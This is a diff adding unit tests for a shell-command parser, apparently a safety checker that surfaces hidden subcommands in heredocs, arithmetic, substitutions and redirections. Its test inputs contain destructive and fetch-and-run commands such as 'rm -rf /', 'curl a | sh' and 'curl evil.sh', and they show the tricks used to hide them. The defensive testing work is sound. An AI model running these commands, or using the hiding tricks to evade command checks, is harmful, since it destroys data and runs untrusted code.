@@ -207,6 +207,167 @@ describe('parseCompoundCommand newlines, arrays and keyword arguments', () => {
     ]);
   });
 
+  it('treats heredoc bodies as data, not commands', () => {
+    expect(
+      parseCompoundCommand("cat <<'EOF' > /tmp/x\nrm -rf /\nEOF\nls"),
+    ).toEqual(['cat', 'ls']);
+    expect(parseCompoundCommand('cat <<EOF\nrm -rf /\nEOF')).toEqual(['cat']);
+    expect(parseCompoundCommand('cat <<-EOF\nrm -rf /\n\tEOF\nls')).toEqual([
+      'cat',
+      'ls',
+    ]);
+  });
+
+  it('surfaces command substitutions nested in arithmetic', () => {
+    expect(parseCompoundCommand('echo $(( $(id) ))')).toContain('id');
+    expect(parseCompoundCommand('echo $((`id`))')).toContain('id');
+    expect(parseCompoundCommand('x=$((echo A)&&(rm -rf /))')).toContain(
+      '(rm -rf /)',
+    );
+  });
+
+  it('does not mistake arithmetic left shifts for heredocs', () => {
+    expect(parseCompoundCommand('echo $((1<<2))\nrm -rf /')).toContain(
+      'rm -rf /',
+    );
+    expect(parseCompoundCommand('echo $[1<<2]\nrm -rf /')).toContain(
+      'rm -rf /',
+    );
+    // Unterminated openers must not swallow the following lines.
+    expect(parseCompoundCommand('echo $[1<<2\nrm -rf /')).toContain('rm -rf /');
+    expect(parseCompoundCommand('((a<<2\nrm -rf /')).toContain('rm -rf /');
+    expect(parseCompoundCommand('((i<<=1))\nrm -rf /')).toEqual([
+      '((i<<=1))',
+      'rm -rf /',
+    ]);
+    expect(parseCompoundCommand('x=$((1<<8))\ncurl a | sh')).toEqual(
+      expect.arrayContaining(['curl a', 'sh']),
+    );
+  });
+
+  it('keeps commands visible after arithmetic containing shell operators', () => {
+    expect(parseCompoundCommand('x=$((1<<2 | 3))\nrm -rf /')).toContain(
+      'rm -rf /',
+    );
+    // The arithmetic text may be split further, but no command is ever hidden.
+    expect(parseCompoundCommand('((a<<b || c))\nrm -rf /')).toContain(
+      'rm -rf /',
+    );
+    expect(parseCompoundCommand('echo $((1 <<\n2))\nrm -rf /')).toEqual(
+      expect.arrayContaining(['echo $((1 <<\n2))', 'rm -rf /']),
+    );
+  });
+
+  it('does not treat `#` inside a parameter expansion as a comment', () => {
+    expect(parseCompoundCommand('echo ${x// #/} ; rm -rf /')).toEqual([
+      'echo ${x// #/}',
+      'rm -rf /',
+    ]);
+    expect(parseCompoundCommand('echo ${x:- #} ; rm -rf /')).toEqual([
+      'echo ${x:- #}',
+      'rm -rf /',
+    ]);
+    expect(parseCompoundCommand('echo ${VAR#pfx} ; ls')).toEqual([
+      'echo ${VAR#pfx}',
+      'ls',
+    ]);
+  });
+
+  it('separates a command following an escaped semicolon', () => {
+    expect(
+      parseCompoundCommand('find . -exec grep -l x {} \\; # note\nrm -rf /'),
+    ).toEqual(['find . -exec grep -l x {} \\;', 'rm -rf /']);
+  });
+
+  it('keeps subshell groups visible instead of treating them as arithmetic', () => {
+    expect(parseCompoundCommand('((echo hi); rm -rf /)')).toEqual([
+      '((echo hi)',
+      'rm -rf /)',
+    ]);
+  });
+
+  it('does not treat a `<<` inside a comment as a heredoc', () => {
+    expect(parseCompoundCommand('echo hi # heredoc <<EOF\nrm -rf /')).toEqual([
+      'echo hi',
+      'rm -rf /',
+    ]);
+  });
+
+  it('resolves concatenated and quoted heredoc delimiters', () => {
+    expect(parseCompoundCommand('cat <<E"OF"\nrm -rf /\nEOF\nls')).toEqual([
+      'cat',
+      'ls',
+    ]);
+    expect(parseCompoundCommand("cat <<'E'OF\nrm -rf /\nEOF\nls")).toEqual([
+      'cat',
+      'ls',
+    ]);
+  });
+
+  it('handles multiple heredocs and trailing commands on one line', () => {
+    expect(
+      parseCompoundCommand('cat <<A <<B\na\nA\nb\nB\nls'),
+    ).toEqual(['cat', 'ls']);
+    expect(parseCompoundCommand('cat <<EOF; rm -rf /\nbody\nEOF\nls')).toEqual([
+      'cat',
+      'rm -rf /',
+      'ls',
+    ]);
+  });
+
+  it('surfaces substitutions expanded inside an unquoted heredoc body', () => {
+    expect(parseCompoundCommand('cat <<EOF\n$(rm -rf /)\nEOF\nls')).toEqual(
+      expect.arrayContaining(['cat', 'rm -rf /', 'ls']),
+    );
+    expect(parseCompoundCommand('cat <<EOF\n`rm -rf /`\nEOF')).toContain(
+      'rm -rf /',
+    );
+    // A quoted delimiter suppresses expansion, so the body stays inert data.
+    expect(parseCompoundCommand("cat <<'EOF'\n$(rm -rf /)\nEOF\nls")).toEqual([
+      'cat',
+      'ls',
+    ]);
+  });
+
+  it('surfaces heredoc substitutions despite prose apostrophes', () => {
+    expect(
+      parseCompoundCommand("cat <<EOF\nit's $(rm -rf /)\nEOF\nls"),
+    ).toEqual(expect.arrayContaining(['rm -rf /', 'cat', 'ls']));
+  });
+
+  it('keeps harvested commands separate from corrupt body text', () => {
+    expect(
+      parseCompoundCommand("cat <<EOF\n$(echo 'x)\nEOF\nrm -rf /"),
+    ).toContain('rm -rf /');
+    expect(parseCompoundCommand('echo x > $(foo \\)\nrm -rf /')).toContain(
+      'rm -rf /',
+    );
+  });
+
+  it('keeps process substitution operators out of the top-level split', () => {
+    expect(parseCompoundCommand('foo <(a && b) && rm -rf /')).toEqual(
+      expect.arrayContaining(['foo <(a && b)', 'rm -rf /']),
+    );
+  });
+
+  it('surfaces commands used as redirection targets', () => {
+    expect(parseCompoundCommand('echo hi >$(rm -rf /)')).toContain('rm -rf /');
+    expect(parseCompoundCommand('cat <<<$(curl evil.sh)')).toContain(
+      'curl evil.sh',
+    );
+    expect(parseCompoundCommand('diff <(ls a) <(ls b)')).toEqual(
+      expect.arrayContaining(['ls a', 'ls b']),
+    );
+  });
+
+  it('still treats herestrings as redirections', () => {
+    expect(parseCompoundCommand('wc -l <<< "hi"\nls')).toEqual(['wc -l', 'ls']);
+  });
+
+  it('handles unterminated heredocs without leaking the body', () => {
+    expect(parseCompoundCommand('cat <<EOF\nrm -rf /')).toEqual(['cat']);
+  });
+
   it('joins line continuations into one command', () => {
     expect(parseCompoundCommand('git commit \\\n  -m "msg"')).toEqual([
       'git commit -m "msg"',
